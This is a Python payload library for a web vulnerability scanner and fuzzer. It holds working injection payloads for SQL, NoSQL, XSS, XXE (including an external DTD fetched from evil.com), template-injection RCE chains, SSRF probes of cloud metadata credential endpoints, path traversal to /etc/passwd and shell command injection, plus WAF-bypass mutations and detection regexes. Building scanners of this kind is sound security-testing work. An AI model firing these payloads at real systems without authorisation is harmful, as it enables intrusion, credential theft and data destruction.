"""Shared payload library, mutation engine, and parameter discovery.

Used by the fuzzer (checks/fuzzer.py) and active scanner (checks/scanner.py).
"""

from __future__ import annotations

import base64
import html
import re
import string
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlencode, quote, quote_plus


# ---------------------------------------------------------------------------
# Payload model
# ---------------------------------------------------------------------------

@dataclass
class Payload:
    value: str
    category: str   # sqli, xss, xxe, ssti, ssrf, lfi, rce, nosqli, open_redirect
    context: str = "url_param"  # url_param, json_body, header, cookie, path_segment
    encoding: str = "raw"       # raw, url, html, base64, unicode, double_url
    description: str = ""
    detect: str = ""            # detection hint (e.g. "error_regex", "time_delay:5")

    def encoded(self, enc: str) -> Payload:
        """Return a copy with the value re-encoded."""
        v = self.value
        if enc == "url":
            v = quote_plus(v)
        elif enc == "double_url":
            v = quote_plus(quote_plus(v))
        elif enc == "html":
            v = html.escape(v)
        elif enc == "base64":
            v = base64.b64encode(v.encode()).decode()
        elif enc == "unicode":
            v = "".join(f"\\u{ord(c):04x}" if c.isascii() and c.isprintable() else c for c in v)
        return Payload(
            value=v, category=self.category, context=self.context,
            encoding=enc, description=self.description, detect=self.detect,
        )


# ---------------------------------------------------------------------------
# Payload Library — categorized collections
# ---------------------------------------------------------------------------

class PayloadLibrary:
    """Categorized payload collections for all major vulnerability classes."""

    # ---- SQLi ----
    SQLI: list[Payload] = [
        # Error-based
        Payload("'", "sqli", description="single quote error probe", detect="sql_error"),
        Payload("\"", "sqli", description="double quote error probe", detect="sql_error"),
        Payload("' OR '1'='1", "sqli", description="classic OR tautology", detect="sql_error"),
        Payload("' OR '1'='1' --", "sqli", description="OR tautology with comment", detect="sql_error"),
        Payload("' OR 1=1 --", "sqli", description="numeric OR tautology", detect="sql_error"),
        Payload("1' ORDER BY 1--", "sqli", description="ORDER BY column probe", detect="sql_error"),
        Payload("1' ORDER BY 100--", "sqli", description="ORDER BY high column", detect="sql_error"),
        Payload("' UNION SELECT NULL--", "sqli", description="UNION SELECT probe", detect="sql_error"),
        Payload("' UNION SELECT NULL,NULL--", "sqli", description="UNION 2 columns", detect="sql_error"),
        Payload("' UNION SELECT NULL,NULL,NULL--", "sqli", description="UNION 3 columns", detect="sql_error"),
        # Blind boolean
        Payload("' AND '1'='1", "sqli", description="boolean true condition", detect="diff"),
        Payload("' AND '1'='2", "sqli", description="boolean false condition", detect="diff"),
        Payload("' AND 1=1--", "sqli", description="numeric boolean true", detect="diff"),
        Payload("' AND 1=2--", "sqli", description="numeric boolean false", detect="diff"),
        # Time-based
        Payload("' AND SLEEP(3)--", "sqli", description="MySQL SLEEP blind", detect="time_delay:3"),
        Payload("'; WAITFOR DELAY '0:0:3'--", "sqli", description="MSSQL WAITFOR blind", detect="time_delay:3"),
        Payload("' AND pg_sleep(3)--", "sqli", description="PostgreSQL pg_sleep blind", detect="time_delay:3"),
        Payload("1; SELECT pg_sleep(3)--", "sqli", description="PostgreSQL stacked sleep", detect="time_delay:3"),
        Payload("' OR IF(1=1,SLEEP(3),0)--", "sqli", description="MySQL conditional sleep", detect="time_delay:3"),
        # Stacked queries
        Payload("'; DROP TABLE test--", "sqli", description="stacked DROP (non-destructive check)", detect="sql_error"),
        Payload("'; SELECT 1--", "sqli", description="stacked SELECT probe", detect="sql_error"),
        # WAF bypass variants
        Payload("/*!50000UNION*//*!50000SELECT*/NULL--", "sqli", description="MySQL version comment bypass"),
        Payload("' /*!UNION*/ /*!SELECT*/ NULL--", "sqli", description="comment UNION bypass"),
        Payload("%27%20OR%201%3D1%20--", "sqli", description="URL-encoded OR tautology"),
        Payload("' oR 1=1--", "sqli", description="mixed case bypass"),
        Payload("' uniOn seLect null--", "sqli", description="mixed case UNION"),
        # NoSQL injection
        Payload("{\"$gt\":\"\"}", "nosqli", context="json_body", description="MongoDB $gt operator", detect="diff"),
        Payload("{\"$ne\":\"\"}", "nosqli", context="json_body", description="MongoDB $ne operator", detect="diff"),
        Payload("{\"$regex\":\".*\"}", "nosqli", context="json_body", description="MongoDB $regex", detect="diff"),
        Payload("{\"$where\":\"1==1\"}", "nosqli", context="json_body", description="MongoDB $where", detect="diff"),
        Payload("true, $where: '1==1'", "nosqli", description="MongoDB where injection"),
        Payload("{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}", "nosqli", context="json_body", description="MongoDB auth bypass"),
        Payload("{\"$or\":[{},{}]}]", "nosqli", context="json_body", description="MongoDB $or bypass"),
    ]

    # ---- XSS ----
    XSS: list[Payload] = [
        Payload("<script>alert(1)</script>", "xss", description="classic script tag", detect="xss_canary"),
        Payload("\"><script>alert(1)</script>", "xss", description="double-quote breakout script", detect="xss_canary"),
        Payload("'><script>alert(1)</script>", "xss", description="single-quote breakout script", detect="xss_canary"),
        Payload("<img src=x onerror=alert(1)>", "xss", description="img onerror", detect="xss_canary"),
        Payload("<svg onload=alert(1)>", "xss", description="svg onload", detect="xss_canary"),
        Payload("<svg/onload=alert(1)>", "xss", description="svg no-space onload", detect="xss_canary"),
        Payload("\" onfocus=alert(1) autofocus=\"", "xss", description="attribute breakout autofocus", detect="xss_canary"),
        Payload("' onfocus=alert(1) autofocus='", "xss", description="single-quote attr breakout", detect="xss_canary"),
        Payload("javascript:alert(1)", "xss", description="javascript: URI", detect="xss_canary"),
        Payload("<body onload=alert(1)>", "xss", description="body onload", detect="xss_canary"),
        Payload("<details open ontoggle=alert(1)>", "xss", description="details ontoggle", detect="xss_canary"),
        Payload("<marquee onstart=alert(1)>", "xss", description="marquee onstart", detect="xss_canary"),
        Payload("<video src=x onerror=alert(1)>", "xss", description="video onerror", detect="xss_canary"),
        Payload("<audio src=x onerror=alert(1)>", "xss", description="audio onerror", detect="xss_canary"),
        Payload("<iframe src=javascript:alert(1)>", "xss", description="iframe javascript URI", detect="xss_canary"),
        Payload("<!--><script>alert(1)</script><!--", "xss", description="HTML comment breakout", detect="xss_canary"),
        Payload("<math><mtext></mtext><mglyph><svg><mtext><textarea><path id=\"></textarea><img onerror=alert(1) src=1>\">", "xss", description="mutation XSS", detect="xss_canary"),
        Payload("'-alert(1)-'", "xss", description="JS string breakout", detect="xss_canary"),
        Payload("\"-alert(1)-\"", "xss", description="JS double-quote breakout", detect="xss_canary"),
        Payload("\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", "xss", description="hex escape XSS", detect="xss_canary"),
        Payload("<a href=\"jAvAsCrIpT:alert(1)\">click</a>", "xss", description="mixed case javascript URI", detect="xss_canary"),
        Payload("<img src=1 href=1 onerror=\"javascript:alert(1)\">", "xss", description="img href onerror", detect="xss_canary"),
        Payload("<input onfocus=alert(1) autofocus>", "xss", description="input autofocus", detect="xss_canary"),
        Payload("<select autofocus onfocus=alert(1)>", "xss", description="select autofocus", detect="xss_canary"),
        Payload("<textarea autofocus onfocus=alert(1)>", "xss", description="textarea autofocus", detect="xss_canary"),
        Payload("<isindex action=javascript:alert(1) type=image>", "xss", description="isindex action", detect="xss_canary"),
        Payload("<form><button formaction=javascript:alert(1)>X</button>", "xss", description="formaction", detect="xss_canary"),
    ]

    # ---- XXE ----
    XXE: list[Payload] = [
        Payload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            "xxe", context="json_body", description="basic file read /etc/passwd", detect="xxe_file",
        ),
        Payload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            "xxe", context="json_body", description="Windows file read win.ini", detect="xxe_file",
        ),
        Payload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            "xxe", context="json_body", description="AWS metadata SSRF via XXE", detect="xxe_ssrf",
        ),
        Payload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo>&send;</foo>',
            "xxe", context="json_body", description="blind OOB XXE via external DTD", detect="xxe_oob",
        ),
        Payload(
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>',
            "xxe", context="json_body", description="/dev/random DoS probe", detect="xxe_error",
        ),
        Payload(
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
            "xxe", context="json_body", description="PHP filter wrapper", detect="xxe_file",
        ),
        Payload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            "xxe", context="json_body", description="expect:// protocol RCE", detect="xxe_rce",
        ),
        Payload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/">]><foo>&xxe;</foo>',
            "xxe", context="json_body", description="gopher SSRF", detect="xxe_ssrf",
        ),
    ]

    # ---- SSTI ----
    SSTI: list[Payload] = [
        Payload("{{7*7}}", "ssti", description="Jinja2/Twig expression", detect="ssti_math"),
        Payload("${7*7}", "ssti", description="EL/Spring expression", detect="ssti_math"),
        Payload("#{7*7}", "ssti", description="Ruby/ERB expression", detect="ssti_math"),
        Payload("<%= 7*7 %>", "ssti", description="ERB expression", detect="ssti_math"),
        Payload("{{config}}", "ssti", description="Jinja2 config dump", detect="ssti_leak"),
        Payload("{{self.__class__.__mro__[1]}}", "ssti", description="Jinja2 MRO chain", detect="ssti_leak"),
        Payload("{{''.__class__.__mro__[2].__subclasses__()}}", "ssti", description="Jinja2 subclass enumeration", detect="ssti_leak"),
        Payload("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "ssti", description="Jinja2 RCE chain", detect="ssti_rce"),
        Payload("{{_self.env.registerUndefinedFilter('x')}}", "ssti", description="Twig filter probe", detect="ssti_error"),
        Payload("*{7*7}", "ssti", description="Thymeleaf expression", detect="ssti_math"),
        Payload("{{=7*7}}", "ssti", description="Eta template expression", detect="ssti_math"),
        Payload("${{7*7}}", "ssti", description="GitHub Actions expression", detect="ssti_math"),
        Payload("{{constructor.constructor('return this')()}}", "ssti", description="Sandbox escape prototype", detect="ssti_leak"),
        Payload("<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "ssti", description="Freemarker RCE", detect="ssti_rce"),
        Payload("#assign($x='') $x.class.forName('java.lang.Runtime')", "ssti", description="Velocity RCE", detect="ssti_rce"),
        Payload("{{['id']|filter('system')}}", "ssti", description="Twig filter chain", detect="ssti_rce"),
        Payload("{{dump(app.config)}}", "ssti", description="Twig dump", detect="ssti_leak"),
        Payload("{{7*'7'}}", "ssti", description="string multiplication test", detect="ssti_math"),
    ]

    # ---- SSRF ----
    SSRF: list[Payload] = [
        Payload("http://127.0.0.1", "ssrf", description="localhost IPv4"),
        Payload("http://localhost", "ssrf", description="localhost hostname"),
        Payload("http://0.0.0.0", "ssrf", description="all interfaces"),
        Payload("http://[::1]", "ssrf", description="IPv6 localhost"),
        Payload("http://169.254.169.254/latest/meta-data/", "ssrf", description="AWS metadata"),
        Payload("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "ssrf", description="AWS IAM credentials"),
        Payload("http://metadata.google.internal/computeMetadata/v1/", "ssrf", description="GCP metadata"),
        Payload("http://169.254.169.254/metadata/v1/", "ssrf", description="DigitalOcean metadata"),
        Payload("http://169.254.169.254/metadata/instance", "ssrf", description="Azure metadata"),
        Payload("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "ssrf", description="GCP token endpoint"),
        Payload("http://127.0.0.1:80", "ssrf", description="localhost port 80"),
        Payload("http://127.0.0.1:443", "ssrf", description="localhost port 443"),
        Payload("http://127.0.0.1:6379", "ssrf", description="Redis port probe"),
        Payload("http://127.0.0.1:27017", "ssrf", description="MongoDB port probe"),
        Payload("http://127.0.0.1:9200", "ssrf", description="Elasticsearch port probe"),
        Payload("http://127.0.0.1:3306", "ssrf", description="MySQL port probe"),
        Payload("http://0177.0.0.1", "ssrf", description="octal localhost"),
        Payload("http://2130706433", "ssrf", description="decimal localhost"),
        Payload("http://0x7f000001", "ssrf", description="hex localhost"),
        Payload("http://127.0.0.1.nip.io", "ssrf", description="DNS rebinding nip.io"),
        Payload("http://localtest.me", "ssrf", description="DNS rebinding localtest.me"),
        Payload("http://spoofed.burpcollaborator.net", "ssrf", description="OOB collaborator hint"),
        Payload("file:///etc/passwd", "ssrf", description="file protocol read"),
        Payload("file:///c:/windows/win.ini", "ssrf", description="Windows file protocol"),
        Payload("dict://127.0.0.1:6379/info", "ssrf", description="dict protocol Redis probe"),
        Payload("gopher://127.0.0.1:6379/_INFO", "ssrf", description="gopher protocol Redis"),
    ]

    # ---- LFI ----
    LFI: list[Payload] = [
        Payload("../../../etc/passwd", "lfi", description="basic Unix traversal", detect="lfi_file"),
        Payload("..\\..\\..\\windows\\win.ini", "lfi", description="basic Windows traversal", detect="lfi_file"),
        Payload("....//....//....//etc/passwd", "lfi", description="double-slash bypass", detect="lfi_file"),
        Payload("..%252f..%252f..%252fetc/passwd", "lfi", description="double-URL-encode bypass", detect="lfi_file"),
        Payload("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "lfi", description="full URL encode", detect="lfi_file"),
        Payload("..%c0%af..%c0%af..%c0%afetc/passwd", "lfi", description="UTF-8 overlong bypass", detect="lfi_file"),
        Payload("/etc/passwd%00", "lfi", description="null byte termination", detect="lfi_file"),
        Payload("../../../etc/passwd%00.png", "lfi", description="null byte + extension", detect="lfi_file"),
        Payload("php://filter/convert.base64-encode/resource=/etc/passwd", "lfi", description="PHP filter wrapper", detect="lfi_base64"),
        Payload("php://filter/convert.base64-encode/resource=index.php", "lfi", description="PHP source disclosure", detect="lfi_base64"),
        Payload("php://input", "lfi", description="PHP input stream", detect="lfi_error"),
        Payload("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+", "lfi", description="data:// wrapper RCE", detect="lfi_rce"),
        Payload("expect://id", "lfi", description="expect:// protocol", detect="lfi_rce"),
        Payload("file:///etc/passwd", "lfi", description="file:// protocol", detect="lfi_file"),
        Payload("/proc/self/environ", "lfi", description="proc environ read", detect="lfi_file"),
        Payload("/proc/self/cmdline", "lfi", description="proc cmdline read", detect="lfi_file"),
        Payload("../../../var/log/apache2/access.log", "lfi", description="Apache log poisoning", detect="lfi_file"),
        Payload("../../../var/log/nginx/access.log", "lfi", description="Nginx log poisoning", detect="lfi_file"),
        Payload("....\\\\....\\\\....\\\\windows\\\\win.ini", "lfi", description="double-backslash Windows", detect="lfi_file"),
        Payload("C:/windows/win.ini", "lfi", description="absolute Windows path", detect="lfi_file"),
        Payload("WEB-INF/web.xml", "lfi", description="Java web.xml disclosure", detect="lfi_file"),
    ]

    # ---- RCE ----
    RCE: list[Payload] = [
        Payload(";id", "rce", description="semicolon command injection", detect="rce_output"),
        Payload("|id", "rce", description="pipe command injection", detect="rce_output"),
        Payload("||id", "rce", description="OR pipe injection", detect="rce_output"),
        Payload("&id", "rce", description="background command injection", detect="rce_output"),
        Payload("&&id", "rce", description="AND command injection", detect="rce_output"),
        Payload("`id`", "rce", description="backtick command substitution", detect="rce_output"),
        Payload("$(id)", "rce", description="dollar-paren substitution", detect="rce_output"),
        Payload(";sleep 5", "rce", description="time-based sleep injection", detect="time_delay:5"),
        Payload("|sleep 5", "rce", description="pipe sleep injection", detect="time_delay:5"),
        Payload("`sleep 5`", "rce", description="backtick sleep", detect="time_delay:5"),
        Payload("$(sleep 5)", "rce", description="dollar-paren sleep", detect="time_delay:5"),
        Payload(";cat /etc/passwd", "rce", description="cat passwd", detect="rce_output"),
        Payload("|cat /etc/passwd", "rce", description="pipe cat passwd", detect="rce_output"),
        Payload(";ping -c 3 127.0.0.1", "rce", description="ping command", detect="time_delay:3"),
        Payload("{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}", "rce", description="Node.js prototype pollution", detect="rce_output"),
    ]

    # ---- Open Redirect ----
    OPEN_REDIRECT: list[Payload] = [
        Payload("https://evil.com", "open_redirect", description="basic redirect", detect="redirect_check"),
        Payload("//evil.com", "open_redirect", description="protocol-relative redirect", detect="redirect_check"),
        Payload("/\\evil.com", "open_redirect", description="backslash redirect", detect="redirect_check"),
        Payload("///evil.com", "open_redirect", description="triple-slash redirect", detect="redirect_check"),
        Payload("https://evil.com%00.good.com", "open_redirect", description="null byte domain bypass", detect="redirect_check"),
        Payload("https://good.com@evil.com", "open_redirect", description="userinfo @ bypass", detect="redirect_check"),
        Payload("https://evil.com#", "open_redirect", description="hash fragment bypass", detect="redirect_check"),
        Payload("javascript:alert(1)", "open_redirect", description="javascript URI", detect="redirect_check"),
        Payload("https://evil%00.com", "open_redirect", description="null byte in domain", detect="redirect_check"),
        Payload("data:text/html,<script>alert(1)</script>", "open_redirect", description="data URI", detect="redirect_check"),
        Payload("https://good.com.evil.com", "open_redirect", description="subdomain impersonation", detect="redirect_check"),
        Payload("https://evil.com/..;/good.com", "open_redirect", description="path segment trick", detect="redirect_check"),
    ]

    @classmethod
    def all_categories(cls) -> dict[str, list[Payload]]:
        return {
            "sqli": cls.SQLI,
            "xss": cls.XSS,
            "xxe": cls.XXE,
            "ssti": cls.SSTI,
            "ssrf": cls.SSRF,
            "lfi": cls.LFI,
            "rce": cls.RCE,
            "open_redirect": cls.OPEN_REDIRECT,
        }

    @classmethod
    def for_category(cls, category: str) -> list[Payload]:
        return cls.all_categories().get(category, [])

    @classmethod
    def for_context(cls, category: str, context: str) -> list[Payload]:
        return [p for p in cls.for_category(category) if p.context == context]


# ---------------------------------------------------------------------------
# Detection regex patterns
# ---------------------------------------------------------------------------

SQL_ERROR_RE = re.compile(
    r"("
    r"you have an error in your sql syntax"
    r"|warning: mysql"
    r"|unclosed quotation mark after the character string"
    r"|quoted string not properly terminated"
    r"|pg::syntaxerror"
    r"|psql: error"
    r"|sqlite3\.operationalerror"
    r"|sqlstate\[\w+\]"
    r"|ora-[0-9]{4,5}"
    r"|microsoft.*odbc.*driver"
    r"|microsoft jet database"
    r"|mssqlquery"
    r"|postgresql.*error"
    r"|mysql_fetch"
    r"|mysql_num_rows"
    r"|supplied argument is not"
    r"|pg_query\(\)"
    r"|pg_exec\(\)"
    r"|sqlite_error"
    r"|sql command not properly ended"
    r"|unexpected end of command"
    r"|invalid column name"
    r"|column .* does not exist"
    r"|table .* does not exist"
    r"|syntax error at or near"
    r"|division by zero"
    r")",
    re.IGNORECASE,
)

SSTI_MATH_RE = re.compile(r"\b49\b")

RCE_OUTPUT_RE = re.compile(
    r"(uid=\d+\([\w]+\)|gid=\d+\([\w]+\)|root:.*:0:0)",
    re.IGNORECASE,
)

LFI_FILE_RE = re.compile(
    r"(root:.*:0:0|\[boot loader\]|\[fonts\]|\[extensions\]|\[mci extensions\])",
    re.IGNORECASE,
)

LFI_BASE64_RE = re.compile(r"^[A-Za-z0-9+/]{20,}={0,2}$")

XXE_FILE_RE = re.compile(
    r"(root:.*:0:0|\[boot loader\]|ami-[0-9a-f]+|instance-id)",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Mutation Engine
# ---------------------------------------------------------------------------

class MutationEngine:
    """Generates encoding and obfuscation variants of base payloads."""

    def mutate(self, payload: Payload) -> list[Payload]:
        """Generate common mutation variants."""
        variants: list[Payload] = []
        # URL encoding
        variants.append(payload.encoded("url"))
        # Double URL encoding
        variants.append(payload.encoded("double_url"))
        # HTML entity encoding
        variants.append(payload.encoded("html"))
        # Base64
        variants.append(payload.encoded("base64"))
        # Case variation (for keywords)
        if any(kw in payload.value.upper() for kw in ("SELECT", "UNION", "SCRIPT", "ALERT", "SLEEP")):
            v = self._case_swap(payload.value)
            variants.append(Payload(
                value=v, category=payload.category, context=payload.context,
                encoding="case_swap", description=payload.description + " (case swap)",
                detect=payload.detect,
            ))
        # Comment insertion (SQL)
        if payload.category == "sqli":
            v = payload.value.replace(" ", "/**/")
            variants.append(Payload(
                value=v, category=payload.category, context=payload.context,
                encoding="comment_insert", description=payload.description + " (comment spaces)",
                detect=payload.detect,
            ))
        return variants

    def for_context(self, category: str, context: str) -> list[Payload]:
        """Return payloads appropriate for the injection context."""
        base = PayloadLibrary.for_context(category, context)
        if not base:
            base = PayloadLibrary.for_category(category)
        return base

    def with_encoding(self, payloads: list[Payload], encoding: str) -> list[Payload]:
        """Re-encode a set of payloads."""
        return [p.encoded(encoding) for p in payloads]

    @staticmethod
    def _case_swap(s: str) -> str:
        return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))


# ---------------------------------------------------------------------------
# Parameter Discovery
# ---------------------------------------------------------------------------

# Common parameter names to brute-force when discovering hidden inputs.
COMMON_PARAMS = [
    "id", "uid", "user", "userid", "user_id", "username", "name",
    "email", "account", "token", "session", "sid", "auth", "key",
    "api_key", "apikey", "secret", "password", "passwd", "pwd",
    "redirect", "redirect_url", "next", "return", "return_url", "url",
    "callback", "cb", "page", "limit", "offset", "sort", "order",
    "search", "q", "query", "keyword", "type", "action", "cmd",
    "command", "exec", "file", "path", "dir", "folder", "lang",
    "locale", "debug", "admin", "test", "mode", "format", "output",
    "data", "input", "value", "content", "body", "text", "message",
    "msg", "error", "status", "code", "ref", "source", "target",
    "dest", "destination", "from", "to", "host", "ip", "port",
    "proxy", "template", "view", "template_id", "config", "setting",
    "option", "param", "param1", "param2", "item", "item_id",
    "product", "product_id", "order_id", "invoice", "payment",
    "upload", "image", "avatar", "photo", "doc", "document",
    "profile", "role", "permission", "group", "team", "org",
    "organization", "workspace", "project", "repo", "repository",
    "version", "v", "ver", "api", "endpoint", "service",
    "callback_url", "redirect_uri", "state", "scope", "grant_type",
    "response_type", "client_id", "client_secret", "access_token",
    "refresh_token", "nonce", "timestamp", "ts", "sign", "signature",
]


class ParameterDiscovery:
    """Discovers hidden parameters and API endpoints."""

    def __init__(self) -> None:
        self._mutation = MutationEngine()

    async def discover_params(
        self,
        url: str,
        http_get: Any,
        baseline: Any | None = None,
        *,
        param_names: list[str] | None = None,
        max_params: int = 50,
    ) -> list[dict[str, Any]]:
        """Probe for hidden query parameters by observing response differences.

        Args:
            url: Target URL (should already have some query params if any).
            http_get: Async callable ``http_get(url) -> response``.
            baseline: Pre-fetched baseline response (optional).
            param_names: Custom param names to try (defaults to COMMON_PARAMS).
            max_params: Cap the number of params to test.

        Returns:
            List of dicts with keys: name, status, length, interesting (bool).
        """
        names = (param_names or COMMON_PARAMS)[:max_params]
        if baseline is None:
            try:
                baseline = await http_get(url)
            except Exception:
                return []

        base_len = len(baseline.text) if hasattr(baseline, "text") else 0
        base_status = baseline.status_code if hasattr(baseline, "status_code") else 200

        sep = "&" if "?" in url else "?"
        discovered: list[dict[str, Any]] = []

        for name in names:
            test_url = f"{url}{sep}{name}=argusai_test_value"
            try:
                r = await http_get(test_url)
            except Exception:
                continue

            status = r.status_code if hasattr(r, "status_code") else 0
            length = len(r.text) if hasattr(r, "text") else 0
            # Interesting if status or length changed significantly
            interesting = (
                status != base_status
                or abs(length - base_len) > 100
                or (base_len > 0 and abs(length - base_len) / base_len > 0.05)
            )
            if interesting:
                discovered.append({
                    "name": name,
                    "url": test_url,
                    "status": status,
                    "length": length,
                    "interesting": True,
                })

        return discovered

    def extract_params_from_js(self, js_code: str) -> list[str]:
        """Extract parameter names from JavaScript source code."""
        params: set[str] = set()
        # URL parameter patterns: ?foo= or &foo=
        for m in re.finditer(r'[?&]([a-zA-Z_][\w]*)=', js_code):
            params.add(m.group(1))
        # Object property assignments in request bodies
        for m in re.finditer(r'["\']([a-zA-Z_]\w*)["\']\s*:', js_code):
            params.add(m.group(1))
        # FormData append calls
        for m in re.finditer(r'\.append\(\s*["\']([a-zA-Z_]\w*)["\']', js_code):
            params.add(m.group(1))
        # URLSearchParams
        for m in re.finditer(r'URLSearchParams.*?["\']([a-zA-Z_]\w*)["\']', js_code):
            params.add(m.group(1))
        return sorted(params)
